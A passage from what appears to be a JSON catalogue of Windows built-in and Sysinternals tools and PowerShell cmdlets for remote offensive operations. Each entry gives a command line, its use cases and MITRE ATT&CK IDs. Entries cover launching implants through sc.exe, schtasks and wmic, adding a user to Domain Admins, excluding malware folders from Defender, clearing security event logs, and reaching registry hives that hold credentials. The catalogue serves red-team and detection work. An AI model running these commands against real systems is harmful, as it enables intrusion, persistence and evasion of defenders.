"", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 83, "name": "psservice.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Sysinternals"], "synopsis": "Lists or controls services on a local or remote system", "description": "List services", "commandline": "psservice.exe \\\\W10.ad.bitsadmin.com config", "usecases": ["Reconnaissance of installed services"], "comments": "", "resources": [], "mitre_techniques": ["T1569.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 84, "name": "psshutdown.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Sysinternals"], "synopsis": "Shutdown, logoff and power manage local and remote systems", "description": "Shutdown computer", "commandline": "psshutdown.exe -f -k \\\\W10.ad.bitsadmin.com", "usecases": ["Affect availability of a computer"], "comments": "Makes use of a service that is installed on the remote system. Better make use of [shutdown.exe](../shutdown)", "resources": [], "mitre_techniques": ["T1529"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 85, "name": "pssuspend.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Sysinternals"], "synopsis": "Suspends or resumes processes on a local or remote system", "description": "Resume process", "commandline": "pssuspend.exe -r \\\\W10.ad.bitsadmin.com procexp.exe", "usecases": [], "comments": "Installs PsSuspend service", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 86, "name": "pssuspend.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Sysinternals"], "synopsis": "Suspends or resumes processes on a local or remote system", "description": "Suspend process", "commandline": "pssuspend.exe \\\\W10.ad.bitsadmin.com procexp.exe", "usecases": ["Alternative to terminating a process"], "comments": "Installs PsSuspend service", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 87, "name": "qappsrv.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Builtin"], "synopsis": "Displays the available Remote Desktop Session Host servers on the network", "description": "Display information about Remote Desktop Session Host server", "commandline": "qappsrv dc1.ad.bitsadmin.com", "usecases": [], "comments": "Equivalent to [query.exe](../query) termserver", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 88, "name": "qprocess.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Builtin"], "synopsis": "Displays information about processes that are running on a Remote Desktop Session Host server", "description": "List all processes", "commandline": "qprocess.exe /server:W10.ad.bitsadmin.com DomainUser2", "usecases": ["Reconnaissance on running processes for a specific user"], "comments": "", "resources": [], "mitre_techniques": ["T1057"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 89, "name": "qprocess.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Builtin"], "synopsis": "Displays information about processes that are running on a Remote Desktop Session Host server", "description": "List all processes", "commandline": "qprocess.exe /server:W10.ad.bitsadmin.com *", "usecases": ["Reconnaissance on running processes"], "comments": "Equivalent to [query.exe](../query) process", "resources": [], "mitre_techniques": ["T1057"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 90, "name": "query.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Displays information about processes, sessions, and Remote Desktop Session Host servers", "description": "List listeners and interactive sessions", "commandline": "query.exe session /server:W10.ad.bitsadmin.com", "usecases": ["Reconnaissance on currently active sessions"], "comments": "Equivalent to [qwinsta.exe](../qwinsta)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 91, "name": "query.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Displays information about processes, sessions, and Remote Desktop Session Host servers", "description": "List logged in users", "commandline": "query.exe user /server:W10.ad.bitsadmin.com", "usecases": ["Reconnaissance on currently active users"], "comments": "Equivalent to [quser.exe](../quser)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 92, "name": "query.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Builtin"], "synopsis": "Displays information about processes, sessions, and Remote Desktop Session Host servers", "description": "List all processes", "commandline": "query.exe process /server:W10.ad.bitsadmin.com *", "usecases": ["Reconnaissance on running processes"], "comments": "Equivalent to [qprocess.exe](../qprocess)", "resources": [], "mitre_techniques": ["T1057"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 93, "name": "query.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Builtin"], "synopsis": "Displays information about processes, sessions, and Remote Desktop Session Host servers", "description": "List all processes", "commandline": "query.exe process /server:W10.ad.bitsadmin.com keepass.exe", "usecases": ["Identify specific running process"], "comments": "Equivalent to [qprocess.exe](../qprocess)", "resources": [], "mitre_techniques": ["T1057"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 94, "name": "query.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Displays information about processes, sessions, and Remote Desktop Session Host servers", "description": "List terminal servers on the network", "commandline": "query.exe termserver", "usecases": [], "comments": "Equivalent to [qappsrv.exe](../qappsrv)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 95, "name": "quser.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Displays information about user sessions on a Remote Desktop Session Host server", "description": "List logged in users", "commandline": "quser.exe /server:W10.ad.bitsadmin.com", "usecases": ["Check whether the system has high-privileged users logged in to then laterally move to it"], "comments": "Equivalent to [query.exe](../query) user", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 96, "name": "qwinsta.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Display information about Remote Desktop Services sessions", "description": "List listeners and interactive sessions", "commandline": "qwinsta.exe /server:W10.ad.bitsadmin.com", "usecases": ["Check whether the system has high-privileged users logged in to then laterally move to it"], "comments": "Equivalent to [query.exe](../query) session", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 97, "name": "reg.exe", "type": "Binaries", "function": "Registry", "toolsets": ["Builtin"], "synopsis": "Query and edit the registry", "description": "Query registry key", "commandline": "reg.exe query \"\\\\W10.ad.bitsadmin.com\\HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "usecases": ["Query registry autoruns"], "comments": "", "resources": [], "mitre_techniques": ["T1012", "T1547.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 98, "name": "reg.exe", "type": "Binaries", "function": "Registry", "toolsets": ["Builtin"], "synopsis": "Query and edit the registry", "description": "Set registry value", "commandline": "reg.exe add \\\\W10.ad.bitsadmin.com\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD", "usecases": ["Configure the remote system, e.g. to support Kerberos authentication for remote desktop", "Configure the automatic start of an implant upon boot"], "comments": "", "resources": [], "mitre_techniques": ["T1112"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 99, "name": "regedit.exe", "type": "Binaries", "function": "Registry", "toolsets": ["Builtin", "GUI"], "synopsis": "Registry Editor", "description": "Registry Editor", "commandline": "regedit.exe", "usecases": ["Read secrets from the registry", "Add persistence"], "comments": "File -> Connect Network Registry", "resources": [], "mitre_techniques": ["T1012", "T1112"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 100, "name": "regini.exe", "type": "Binaries", "function": "Registry", "toolsets": ["Builtin", "TODO"], "synopsis": "Modifies the registry from the command line or a script", "description": "Import ini into registry of remote system", "commandline": "regini.exe -m \\\\W10.ad.bitsadmin.com mybackdoor.ini", "usecases": ["Add registry persistence"], "comments": "", "resources": [], "mitre_techniques": ["T1112"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 101, "name": "rendom.exe", "type": "Binaries", "function": "Domain", "toolsets": ["Builtin", "TODO"], "synopsis": "Performs various actions necessary for a domain rename operation", "description": "TODO", "commandline": "rendom.exe", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 102, "name": "repadmin.exe", "type": "Binaries", "function": "Data", "toolsets": ["Builtin"], "synopsis": "Diagnose Active Directory replication problems between domain controllers", "description": "Show replication state", "commandline": "repadmin.exe /replsummary /homeserver:DC1.ad.bitsadmin.com", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 103, "name": "reset.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Reset the session subsytem hardware and software to known initial values", "description": "Logoff user", "commandline": "reset.exe session 1 /SERVER:W10.ad.bitsadmin.com /V", "usecases": [], "comments": "Sessions can be queried using [qwinsta.exe](../qwinsta)\nEquivalent to [rwinsta.exe](../rwinsta)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 104, "name": "rpcdump.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Extra"], "synopsis": "RPC endpoint diagnostic utility", "description": "List RPC endpoints", "commandline": "rpcdump.exe /S W10.ad.bitsadmin.com /V /I > W10.txt", "usecases": ["Identify whether certain services or software is running based on the available RPC interfaces"], "comments": "Part of the Windows Server 2003 Resource Kit", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 105, "name": "rwinsta.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Reset the session subsytem hardware and software to known initial values", "description": "TODO", "commandline": "rwinsta.exe 1 /SERVER:W10.ad.bitsadmin.com /V", "usecases": [], "comments": "Sessions can be queried using [qwinsta.exe](../qwinsta)\nEquivalent to [reset.exe](../reset)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 106, "name": "sc.exe", "type": "Binaries", "function": "Execute", "toolsets": ["Builtin"], "synopsis": "Interact with the Service Control Manager database", "description": "Create service", "commandline": "sc.exe \\\\W10.ad.bitsadmin.com create MyService binpath= C:\\Windows\\implant.exe", "usecases": ["Create service pointing to implant binary"], "comments": "", "resources": [], "mitre_techniques": ["T1569.002", "T1543.003"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 107, "name": "sc.exe", "type": "Binaries", "function": "Execute", "toolsets": ["Builtin"], "synopsis": "Interact with the Service Control Manager database", "description": "Disable service", "commandline": "sc.exe \\\\W10.ad.bitsadmin.com config wuauserv start= disabled", "usecases": ["Impair security defenses"], "comments": "", "resources": [], "mitre_techniques": ["T1489"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 108, "name": "sc.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Builtin"], "synopsis": "Interact with the Service Control Manager database", "description": "List services", "commandline": "sc.exe \\\\W10.ad.bitsadmin.com query", "usecases": ["Reconnaissance of installed services"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 109, "name": "sc.exe", "type": "Binaries", "function": "Execute", "toolsets": ["Builtin"], "synopsis": "Interact with the Service Control Manager database", "description": "Start service", "commandline": "sc.exe \\\\W10.ad.bitsadmin.com start MyService", "usecases": ["Launch implant"], "comments": "", "resources": [], "mitre_techniques": ["T1569.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 110, "name": "sc.exe", "type": "Binaries", "function": "Execute", "toolsets": ["Builtin"], "synopsis": "Interact with the Service Control Manager database", "description": "Stop service", "commandline": "sc.exe \\\\W10.ad.bitsadmin.com stop wuauserv", "usecases": ["Impair security defenses"], "comments": "", "resources": [], "mitre_techniques": ["T1489"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 111, "name": "schtasks.exe", "type": "Binaries", "function": "Execute", "toolsets": ["Builtin"], "synopsis": "Create, delete, query, change, run and end scheduled tasks", "description": "Create new task", "commandline": "schtasks.exe /S W10.ad.bitsadmin.com /Create /RU SYSTEM /SC HOURLY /TN \"Microsoft\\Windows\\Printing\\Print Spooler (x64)\" /TR \"C:\\Windows\\System32\\spoolsv64.exe", "usecases": ["Command execution through scheduled task", "Persistence by registering a scheduled task"], "comments": "", "resources": [], "mitre_techniques": ["T1053.005"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-11-04"}, {"id": 112, "name": "schtasks.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Builtin"], "synopsis": "Create, delete, query, change, run and end scheduled tasks", "description": "List tasks", "commandline": "schtasks.exe /S W10.ad.bitsadmin.com", "usecases": ["List current tasks to identify a name that can be used for a new task to blend in"], "comments": "", "resources": [], "mitre_techniques": ["T1053.005"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-11-04"}, {"id": 113, "name": "scp.exe", "type": "Binaries", "function": "Data", "toolsets": ["Builtin"], "synopsis": "Secure Copy", "description": "Copy file locally from SSH server authenticating using Kerberos", "commandline": "scp.exe -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes myuser@linux.ad.bitsadmin.com:/tmp/file.tgz file.tgz", "usecases": ["Data collection", "Tool transfer"], "comments": "", "resources": [], "mitre_techniques": ["T1105"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 114, "name": "sdelete.exe", "type": "Binaries", "function": "Data", "toolsets": ["Sysinternals"], "synopsis": "Secure file delete", "description": "Securely delete a file", "commandline": "sdelete \\\\W10.ad.bitsadmin.com\\C$\\backdoor.exe", "usecases": ["Cleanup of traces"], "comments": "", "resources": [], "mitre_techniques": ["T1070.004"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 115, "name": "setspn.exe", "type": "Binaries", "function": "Domain", "toolsets": ["Builtin"], "synopsis": "Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account", "description": "List SPNs for a specific account", "commandline": "setspn.exe -L ad.bitsadmin.com\\SP2019", "usecases": ["Reconnaissance"], "comments": "Can be both a regular account as well as a computer account", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 116, "name": "setspn.exe", "type": "Binaries", "function": "Domain", "toolsets": ["Builtin"], "synopsis": "Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account", "description": "List all SPNs in the domain", "commandline": "setspn.exe -T ad.bitsadmin.com -Q */*", "usecases": ["Reconnaissance"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 117, "name": "setspn.exe", "type": "Binaries", "function": "Domain", "toolsets": ["Builtin"], "synopsis": "Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account", "description": "Set SPN", "commandline": "setspn.exe -S HTTP/EXCH2019.ad.bitsadmin.com EXCH2019", "usecases": ["Add an SPN to a user for a targeted Kerberoast"], "comments": "Error when execution from Offensive Windows VM: `Ldap Error(0x51 -- Server Down): ldap_connect; Failed to retrieve DN for domain \"\" : 0x00000051; Warning: No valid targets specified, reverting to current domain.; FindDomainForAccount: Call to DsGetDcNameWithAccountW failed with return value 0x0000054B; Unable to locate account SP2019`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 118, "name": "setx.exe", "type": "Binaries", "function": "Registry", "toolsets": ["Builtin"], "synopsis": "Modifies the value of a service's entries in the registry and in the Service Control Manager database", "description": "Set machine-wide environment variables", "commandline": "setx.exe /S W10.ad.bitsadmin.com /M MYVAR \"Hello there!", "usecases": ["Configure a path order hijack"], "comments": "", "resources": [], "mitre_techniques": ["T1112"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 119, "name": "shadow.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Remotely control an active session of another user on a Remote Desktop Session Host server", "description": "RDP shadow a user session", "commandline": "shadow.exe 3 /SERVER:W10.ad.bitsadmin.com", "usecases": [], "comments": "Starting from Windows 8/Server 2012 this binary is replaced with `mstsc.exe`", "resources": ["https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing"], "mitre_techniques": ["T1563.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 120, "name": "shrpubw.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Create a Shared Folder Wizard", "description": "Create a Shared Folder Wizard", "commandline": "shrpubw /s W10.ad.bitsadmin.com", "usecases": ["Add (hidden - dollar share) shared folder"], "comments": "Alternatively, use [fsmgmt.msc](../../MMC/fsmgmt)", "resources": [], "mitre_techniques": ["T1135", "T1021.002"], "detections": "Port: 445/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 121, "name": "shutdown.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Shut down or restart local or remote computers, one at a time", "description": "Restart machine", "commandline": "shutdown.exe /r /f /t 0 /m \\\\W10.ad.bitsadmin.com", "usecases": ["Affect availability of a computer"], "comments": "", "resources": [], "mitre_techniques": ["T1529"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 122, "name": "sqlcmd.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Extra"], "synopsis": "Integrated environment for managing any SQL infrastructure, from SQL Server to Azure SQL Database", "description": "SQL Server Command Line Tool", "commandline": "sqlcmd.exe -S SQL1.ad.bitsadmin.com\\SQLEXPRESS", "usecases": ["Connect to MSSQL database and execute commands on the underlying OS using the `xp_cmdshell` stored procedure, execute CLR code or pivot over MSSQL server links"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 123, "name": "srvcheck.exe", "type": "Binaries", "function": "Data", "toolsets": ["Extra"], "synopsis": "Server share check", "description": "Displays a list of server shares and who has access", "commandline": "srvcheck.exe \\\\DC1.ad.bitsadmin.com", "usecases": [], "comments": "Part of the Windows Server 2003 Resource Kit", "resources": [], "mitre_techniques": ["T1135"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 124, "name": "srvinfo.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Extra"], "synopsis": "Gather information about a target server", "description": "List computer information", "commandline": "srvinfo.exe \\\\DC1.ad.bitsadmin.com", "usecases": ["List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities"], "comments": "Similar to [systeminfo.exe](../systeminfo)\nPart of the Windows Server 2003 Resource Kit", "resources": [], "mitre_techniques": ["T1082"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 125, "name": "ssh.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Secure Shell client", "description": "Connect to SSH server using Kerberos", "commandline": "ssh.exe -Kv myuser@linux.ad.bitsadmin.com", "usecases": ["Lateral movement"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 126, "name": "systeminfo.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Builtin"], "synopsis": "Displays detailed configuration information about a computer and its operating system, including operating system configuration, security information, product ID, and hardware properties", "description": "Show system information", "commandline": "systeminfo.exe /S W10.ad.bitsadmin.com", "usecases": ["List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities"], "comments": "", "resources": ["https://blog.bitsadmin.com/windows-security-updates-for-hackers"], "mitre_techniques": ["T1082"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 127, "name": "takeown.exe", "type": "Binaries", "function": "Data", "toolsets": ["Builtin", "TODO"], "synopsis": "Allows an administrator to recover access to a file that was denied by re-assigning file ownership", "description": "Take ownership over a file", "commandline": "takeown.exe /S system /F MyShare\\Acme*.doc", "usecases": ["Alter permissions"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 128, "name": "taskkill.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Builtin"], "synopsis": "Terminate tasks by process id (PID) or image name", "description": "Kill a process", "commandline": "taskkill.exe /S W10.ad.bitsadmin.com /F /IM cmd.exe", "usecases": ["Terminate a process"], "comments": "", "resources": [], "mitre_techniques": ["T1562.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 129, "name": "tasklist.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Builtin"], "synopsis": "Displays a list of currently running processes", "description": "List processes", "commandline": "tasklist.exe /S W10.ad.bitsadmin.com /FO CSV > W10_tasklist.csv", "usecases": ["Perform reconnaissance on executing processes"], "comments": "", "resources": [], "mitre_techniques": ["T1057"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 130, "name": "tsdiscon.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["Builtin"], "synopsis": "Disconnects a session from a Remote Desktop Session Host (RD Session Host) server", "description": "Disconnect a user", "commandline": "tsdiscon.exe rdp-tcp#1 /server:W10.ad.bitsadmin.com", "usecases": [], "comments": "", "resources": [], "mitre_techniques": ["T1531"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 131, "name": "tskill.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Builtin"], "synopsis": "Ends a process", "description": "Kill a process", "commandline": "tskill.exe cmd /Server:W10.ad.bitsadmin.com /A /V", "usecases": ["Terminate a process"], "comments": "", "resources": [], "mitre_techniques": ["T1562.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 132, "name": "typeperf.exe", "type": "Binaries", "function": "Logs", "toolsets": ["Builtin", "TODO"], "synopsis": "Writes performance data to the command window or to a log file", "description": "TODO", "commandline": "typeperf.exe \"\\\\W10.ad.bitsadmin.com\\Processor(0)\\% User Time", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 133, "name": "uptime.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Extra"], "synopsis": "Display uptime of a system", "description": "Show uptime", "commandline": "uptime.exe W10.ad.bitsadmin.com", "usecases": ["Identify if a machine could be relevant for longer term persistence without having to install persistence"], "comments": "", "resources": [], "mitre_techniques": ["T1082"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 134, "name": "volrest.exe", "type": "Binaries", "function": "Data", "toolsets": ["Extra"], "synopsis": "Previous Version command-line tool", "description": "List snapshots of network share", "commandline": "volrest.exe \\\\W10.ad.bitsadmin.com\\C$\\Windows\\System32\\Config", "usecases": ["List snapshots of the config directory and then copy the `SAM`/`SECURITY`/`SYSTEM` files from that snapshot"], "comments": "Also known as volume shadow copies\nPart of the Windows Server 2003 Resource Kit", "resources": ["https://blog.bitsadmin.com/extracting-credentials-from-remote-windows-system"], "mitre_techniques": ["T1083", "T1003.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 135, "name": "w32tm.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Builtin"], "synopsis": "Synchronize the date and time", "description": "Show time details", "commandline": "w32tm.exe /query /computer:W10.ad.bitsadmin.com /status /verbose", "usecases": [], "comments": "", "resources": [], "mitre_techniques": ["T1124"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 136, "name": "waitfor.exe", "type": "Binaries", "function": "Misc", "toolsets": ["Builtin", "TODO"], "synopsis": "Sends or waits for a signal on a system", "description": "TODO", "commandline": "waitfor.exe", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 137, "name": "wevtutil.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Builtin"], "synopsis": "Windows Events Command Line Utility", "description": "Clear security event log", "commandline": "wevtutil /remote:CAROOT1.ad.bitsadmin.com cl Security", "usecases": ["Cover tracks clearing past events"], "comments": "See also [Clear-EventLog](../../Cmdlets/Clear-Eventlog)", "resources": [], "mitre_techniques": ["T1070.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-14"}, {"id": 138, "name": "winrs.exe", "type": "Binaries", "function": "Execute", "toolsets": ["Builtin"], "synopsis": "Manage and execute programs remotely", "description": "Execute WinRM command", "commandline": "winrs.exe -r:W10.ad.bitsadmin.com ipconfig /all", "usecases": ["Perform reconnaissance or launch implant"], "comments": "", "resources": [], "mitre_techniques": ["T1021.006", "T1059.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 139, "name": "winrs.exe", "type": "Binaries", "function": "Execute", "toolsets": ["Builtin"], "synopsis": "Manage and execute programs remotely", "description": "Launch interactive shell", "commandline": "winrs.exe -r:W10.ad.bitsadmin.com cmd", "usecases": [], "comments": "", "resources": [], "mitre_techniques": ["T1021.006"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 140, "name": "wmic.exe", "type": "Binaries", "function": "Execute", "toolsets": ["Builtin"], "synopsis": "Command-line interface for Windows Management Instrumentation (WMI)", "description": "Launch process", "commandline": "wmic.exe /node:W10.ad.bitsadmin.com process call create \"beacon.exe", "usecases": ["Launch implant"], "comments": "", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 141, "name": "wmic.exe", "type": "Binaries", "function": "Processes", "toolsets": ["Builtin"], "synopsis": "Command-line interface for Windows Management Instrumentation (WMI)", "description": "Query processes", "commandline": "wmic.exe /node:W10.ad.bitsadmin.com /output:processes.csv process list /format:CSV", "usecases": ["Reconnaissance on running processes"], "comments": "", "resources": [], "mitre_techniques": ["T1057", "T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 142, "name": "Add-ADGroupMember", "type": "Cmdlets", "function": "Domain", "toolsets": ["RSAT"], "synopsis": "Adds one or more members to an Active Directory group", "description": "Add user to domain group", "commandline": "Add-ADGroupMember 'Domain Admins' -Members Hacker", "usecases": ["Add a user to a certain domain group to obtain certain privileges"], "comments": "PowerShell Module: `ActiveDirectory`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 143, "name": "Add-DnsClientNrptRule", "type": "Cmdlets", "function": "Manage", "toolsets": ["CIMSession", "TODO"], "synopsis": "Adds a rule to the NRPT", "description": "TODO", "commandline": "Add-DnsClientNrptRule -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `DnsClient`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 144, "name": "Add-EtwTraceProvider", "type": "Cmdlets", "function": "Misc", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Adds an ETW trace provider to an ETW Autologger configuration or ETW session", "description": "TODO", "commandline": "Add-EtwTraceProvider -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `EventTracingManagement`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 145, "name": "Add-MpPreference", "type": "Cmdlets", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Modifies settings for Windows Defender", "description": "Exclude path from AV", "commandline": "Add-MpPreference -ExclusionPath 'C:\\EvilTools' -CimSession $s", "usecases": ["Exclude path from AV so malicious tools can be stored there"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPowerShell Module: `Defender`", "resources": [], "mitre_techniques": ["T1047"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 146, "name": "Add-NetEventPacketCaptureProvider", "type": "Cmdlets", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Adds a Remote Packet Capture provider", "description": "Add packet capture provider to eventsession", "commandline": "Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical -TruncationLength ([UInt16]::MaxValue)", "usecases": ["Sniff authentication traffic on a domain controller and locally crack the hashes"], 